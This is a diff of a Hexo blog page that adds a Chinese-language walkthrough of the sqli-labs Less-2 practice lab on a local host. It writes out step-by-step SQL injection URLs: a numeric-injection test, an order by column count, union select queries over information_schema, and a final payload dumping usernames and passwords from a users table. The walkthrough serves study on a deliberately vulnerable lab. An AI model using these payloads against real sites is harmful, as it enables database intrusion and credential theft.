@@ -8,13 +8,15 @@
   <link rel="dns-prefetch" href="http://example.com">
   <title>My New Post | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="article">
+  <meta name="description" content="sqlilab lesson2less-2：（步骤）1、判断是否可注入以及注入类型数字型注入（补充）  url为 http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-2&#x2F;?id&#x3D;1&#39;时，因为有一个多余的&quot;单引号&quot;使查询语句错误  url为 http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-2&#x2F;?id&#x3D;1 and 1&#x3D;1时，没有报错  url为">
+<meta property="og:type" content="article">
 <meta property="og:title" content="My New Post">
-<meta property="og:url" content="http://example.com/2021/11/29/My-New-Post/index.html">
+<meta property="og:url" content="http://example.com/2021/11/29/sqlilab-lesson2/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="sqlilab lesson2less-2：（步骤）1、判断是否可注入以及注入类型数字型注入（补充）  url为 http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-2&#x2F;?id&#x3D;1&#39;时，因为有一个多余的&quot;单引号&quot;使查询语句错误  url为 http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-2&#x2F;?id&#x3D;1 and 1&#x3D;1时，没有报错  url为">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2021-11-29T12:43:05.000Z">
-<meta property="article:modified_time" content="2021-11-29T12:43:05.308Z">
+<meta property="article:modified_time" content="2022-01-14T04:22:58.922Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
   
@@ -163,7 +165,7 @@
           </div>
           <div id="js-content" class="content-ll">
             
-<article id="post-My-New-Post" class="article article-type-post " itemscope itemprop="blogPost">
+<article id="post-sqlilab-lesson2" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
@@ -175,7 +177,7 @@
   
 
         
-        <a href="/2021/11/29/My-New-Post/" class="archive-article-date">
+        <a href="/2021/11/29/sqlilab-lesson2/" class="archive-article-date">
   	<time datetime="2021-11-29T12:43:05.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-11-29</time>
 </a>
         
@@ -183,7 +185,24 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        
+        <h1 id="sqlilab-lesson2"><a href="#sqlilab-lesson2" class="headerlink" title="sqlilab lesson2"></a>sqlilab lesson2</h1><h2 id="less-2：（步骤）"><a href="#less-2：（步骤）" class="headerlink" title="less-2：（步骤）"></a>less-2：（步骤）</h2><h3 id="1、判断是否可注入以及注入类型"><a href="#1、判断是否可注入以及注入类型" class="headerlink" title="1、判断是否可注入以及注入类型"></a>1、判断是否可注入以及注入类型</h3><p>数字型注入（补充）</p>
+<ol>
+<li><p>url为 <a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs/Less-2/?id=1&#39;%E6%97%B6%EF%BC%8C%E5%9B%A0%E4%B8%BA%E6%9C%89%E4%B8%80%E4%B8%AA%E5%A4%9A%E4%BD%99%E7%9A%84&quot;%E5%8D%95%E5%BC%95%E5%8F%B7&quot;%E4%BD%BF%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5%E9%94%99%E8%AF%AF">http://127.0.0.1/sqli-labs/Less-2/?id=1&#39;时，因为有一个多余的&quot;单引号&quot;使查询语句错误</a></p>
+</li>
+<li><p>url为 <a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs/Less-2/?id=1">http://127.0.0.1/sqli-labs/Less-2/?id=1</a> and 1=1时，没有报错</p>
+</li>
+<li><p>url为 <a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs/Less-2/?id=1">http://127.0.0.1/sqli-labs/Less-2/?id=1</a> and 1=2时，由于1=2不成立，也会报错</p>
+</li>
+</ol>
+<p>满足这三个，基本上就是数字注入了否则则为字符型</p>
+<h3 id="2、判断列数"><a href="#2、判断列数" class="headerlink" title="2、判断列数"></a>2、判断列数</h3><p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-2/?id=1">http://127.0.0.1/sqli-labs-master/Less-2/?id=1</a> order by 3–+</p>
+<h3 id="3、判断哪些可回显"><a href="#3、判断哪些可回显" class="headerlink" title="3、判断哪些可回显"></a>3、判断哪些可回显</h3><p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-2/?id=1">http://127.0.0.1/sqli-labs-master/Less-2/?id=1</a> union select 1,2,3–+</p>
+<h3 id="4、查看数据库"><a href="#4、查看数据库" class="headerlink" title="4、查看数据库"></a>4、查看数据库</h3><p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-2/?id=-1">http://127.0.0.1/sqli-labs-master/Less-2/?id=-1</a> union select 1,2,group_concat(schema_name) from information_schema.schemata–+</p>
+<h3 id="5、查看此库中的所有表"><a href="#5、查看此库中的所有表" class="headerlink" title="5、查看此库中的所有表"></a>5、查看此库中的所有表</h3><p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-2/?id=-1&#39;">http://127.0.0.1/sqli-labs-master/Less-2/?id=-1&#39;</a> union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’security’–+</p>
+<h3 id="6、查看users中的列信息"><a href="#6、查看users中的列信息" class="headerlink" title="6、查看users中的列信息"></a>6、查看users中的列信息</h3><p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-2/?id=-1&#39;">http://127.0.0.1/sqli-labs-master/Less-2/?id=-1&#39;</a> union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’users’–+</p>
+<h3 id="7、查看所有字段"><a href="#7、查看所有字段" class="headerlink" title="7、查看所有字段"></a>7、查看所有字段</h3><p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-2/?id=-1">http://127.0.0.1/sqli-labs-master/Less-2/?id=-1</a> union select 1,2,group_concat(concat_ws(‘~’,username,password) )from security.users–+</p>
+<p>与练习一类似，不同点在于注入类型的判断</p>
+
       
 
       
@@ -272,7 +291,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://tl-memorable.github.io/021/11/29/My-New-Post/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://tl-memorable.github.io/021/11/29/sqlilab-lesson2/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -324,7 +343,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    目录，不存在的…
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#sqlilab-lesson2"><span class="toc-number">1.</span> <span class="toc-text">sqlilab lesson2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#less-2%EF%BC%9A%EF%BC%88%E6%AD%A5%E9%AA%A4%EF%BC%89"><span class="toc-number">1.1.</span> <span class="toc-text">less-2：（步骤）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%8F%AF%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8A%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.1.1.</span> <span class="toc-text">1、判断是否可注入以及注入类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E5%88%A4%E6%96%AD%E5%88%97%E6%95%B0"><span class="toc-number">1.1.2.</span> <span class="toc-text">2、判断列数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E5%88%A4%E6%96%AD%E5%93%AA%E4%BA%9B%E5%8F%AF%E5%9B%9E%E6%98%BE"><span class="toc-number">1.1.3.</span> <span class="toc-text">3、判断哪些可回显</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E3%80%81%E6%9F%A5%E7%9C%8B%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.1.4.</span> <span class="toc-text">4、查看数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5%E3%80%81%E6%9F%A5%E7%9C%8B%E6%AD%A4%E5%BA%93%E4%B8%AD%E7%9A%84%E6%89%80%E6%9C%89%E8%A1%A8"><span class="toc-number">1.1.5.</span> <span class="toc-text">5、查看此库中的所有表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6%E3%80%81%E6%9F%A5%E7%9C%8Busers%E4%B8%AD%E7%9A%84%E5%88%97%E4%BF%A1%E6%81%AF"><span class="toc-number">1.1.6.</span> <span class="toc-text">6、查看users中的列信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7%E3%80%81%E6%9F%A5%E7%9C%8B%E6%89%80%E6%9C%89%E5%AD%97%E6%AE%B5"><span class="toc-number">1.1.7.</span> <span class="toc-text">7、查看所有字段</span></a></li></ol></li></ol></li></ol>
                     </div>
                 </span>
             </div>
